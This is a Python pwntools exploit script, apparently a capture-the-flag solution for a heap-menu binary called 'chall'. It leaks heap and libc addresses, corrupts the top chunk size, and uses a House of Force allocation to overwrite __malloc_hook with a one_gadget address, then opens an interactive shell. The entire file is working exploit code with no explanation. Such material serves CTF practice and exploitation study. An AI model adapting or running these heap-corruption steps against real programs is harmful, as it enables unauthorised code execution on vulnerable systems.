#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from pwn import *
from time import sleep
exe  = context.binary = ELF('./chall')
host = args.HOST or '0.0.0.0'
port = int(args.PORT or 1937)

p = lambda x: p64(x)

idx=-1

def option(choice):
	io.sendlineafter(b"> ", str(choice).encode('latin-1'))

def add(size, data, hack=False):
	global idx
	idx+=1
	print(f"add {idx} {size}")
	option(1)
	io.sendlineafter(b"enter the index : ", str(idx).encode('latin-1'))
	io.sendlineafter(b"enter the size : ", str(size).encode('latin-1'))
	if hack:
		io.interactive()
	io.sendafter(b"Input : ", data)
	return idx

def delete(idx):
	print(f"delete {idx}")
	option(2)
	io.sendlineafter(b"enter the index : ", str(idx).encode('latin-1'))

def edit(idx, data):
	print(f"edit {idx}")
	option(4)
	io.sendlineafter(b"enter the index : ", str(idx).encode('latin-1'))
	io.sendlineafter(b"Input : ", data)

def show(idx):
	option(3)
	io.sendlineafter(b"enter the index : ", str(idx).encode('latin-1'))
	return io.recvline()

libc=ELF("./libc.so.6")
# io = process("./chall")
io = remote("127.0.0.1", "1937")

add(21, b"\x00")
add(120, (p(0) + p(0x21))*7)
add(120, (p(0) + p(0x21))*7)
add(21, b"\x00")
delete(1)
delete(2)
leak_idx=add(120, b"\xff")
heap_base=u64(show(leak_idx)[:6].ljust(8, b'\x00'))-0xff
print(hex(heap_base))
ub=add(128, b"A")
delete(ub)
ub=add(120, b"A")
libc.address=u64(show(ub)[:6].ljust(8, b'\x00'))-0x3c3b41
print(hex(libc.address))
binsh=next(libc.search(b'/bin/sh\x00'))
edit(4, (p(0) + p(0))*9 + p(0) + p(0xffffffffffffffff))
top_chunk = heap_base + 0x140
distance = (libc.sym.__malloc_hook - 0x20 ) - top_chunk
add(distance, b"A")
add(128, p(libc.address+0xef9f4))
delete(3)
io.interactive()